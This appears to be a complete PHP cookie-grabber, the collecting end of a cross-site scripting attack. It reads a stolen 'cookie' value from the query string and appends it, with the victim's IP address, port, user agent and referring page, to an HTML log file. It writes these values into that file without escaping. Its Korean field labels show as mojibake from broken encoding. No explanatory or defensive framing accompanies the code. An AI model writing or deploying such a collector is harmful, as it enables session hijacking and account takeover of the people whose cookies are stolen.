<?
        $log_time = date("Y/m/d(H:i:s)", time());
        $logname = date('Ymd');
        $fp = fopen("cookie.html","a+");
		$REMOTE_ADDR=$_SERVER['REMOTE_ADDR'];
		$REMOTE_PORT=$_SERVER['REMOTE_PORT'];
		$HTTP_USER_AGENT=$_SERVER['HTTP_USER_AGENT'];		
		$HTTP_REFERER=$_SERVER['HTTP_REFERER'];
        $cookie = $_GET['cookie'];
        fwrite($fp,"
                <table width='100%' height='22%' border='1' cellpadding='5'>
  <tr>
    <td width='8%' height='27%' align='right'>�ð� : </td>
    <td width='55%'> $log_time </td>
    <td width='6%' align='right'>������  : </td>
    <td width='31%'>$REMOTE_ADDR:$REMOTE_PORT</td>
  </tr>
  <tr>
    <td height='27%' align='right'>������ : </td>
    <td colspan='3'>$HTTP_USER_AGENT</td>
  </tr>
  <tr>
    <td height='27%' align='right'>�����ּ� : </td>
    <td colspan='3'><a href='$HTTP_REFERER'>$HTTP_REFERER</td>
  </tr>
  <tr>
    <td height='19%' align='right'>��Ű : </td>
    <td style='word-break:break-all;' colspan='3'>$cookie</td>
  </tr>
</table>
                ");
        fclose($fp);
?>
